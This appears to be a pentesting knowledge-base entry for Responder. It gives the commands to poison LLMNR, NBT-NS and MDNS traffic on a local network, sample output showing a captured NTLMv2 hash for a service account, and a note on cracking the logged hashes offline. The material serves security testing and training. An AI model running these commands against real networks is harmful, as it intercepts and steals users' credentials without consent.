---
type: command
executor: bash
data: responder -I $_INTERFACE
platforms:
  - Linux
tags:
  - ntlm
  - credential-access
verified: true
validated: true
---

# responder-intercept-ntlm-hash

## Command

```bash
responder -I $_INTERFACE
```

## Description

This command starts Responder on a specified network interface to perform LLMNR, NBT-NS, and MDNS poisoning, intercepting NTLMv2-SSP hashes from authentication attempts, such as SMB connections. It is ideal for passive credential harvesting in local network scenarios like waiting for victim queries or triggering via file shares.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-I` | Specifies the network interface (e.g., eth0, wlan0) to bind and listen on | Yes |
| `$_INTERFACE` | Placeholder for the interface name (e.g., eth0) | Yes |

## Examples

### Basic Usage

```bash
sudo responder -I eth0
```

### Advanced Usage

Enable additional features like WPAD poisoning, NBT-NS reflection, and client fingerprinting:
```bash
sudo responder -I eth0 -w -r -f
```

## Expected Output

The tool initializes its poisoners and servers, then listens for events. Upon successful hash capture, it displays details like:

```
root@kali:~# responder -I eth0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 2.3.3.9

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CRTL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
...
[+] Listening for events...
[SMBv2] NTLMv2-SSP Client   : 10.10.10.10
[SMBv2] NTLMv2-SSP Username : BOB\mssql-svc
[SMBv2] NTLMv2-SSP Hash     : mssql-svc::BOB:9906216b9bfb7353:C887578FCEC28FE5D27D98BE125563CD:0101000000000000C0653150DE09D201C8FAE92FB32A810B000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000000300000765B8BC67A6A62885BDC779C99E61D6D82291EBB7DDB4DF24FE2AF8AF36813510A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0034003500000000000000000000000000
[*] Skipping previously captured hash for BOB\mssql-svc
[SMBv2] NTLMv2-SSP Client   : 10.10.10.10
[SMBv2] NTLMv2-SSP Username : \gX
[SMBv2] NTLMv2-SSP Hash     : gX:::39aa9031a80680cd::
[*] Skipping previously captured hash for \gX
[+] Exiting...
```

Hashes can be found in Responder's logs (e.g., /usr/share/responder/logs/) for offline cracking.

## Related

- [[tools/Responder]]
- [[procedures/Steal-NTLMv2-Hash-with-SCF-File-and-SMB]]
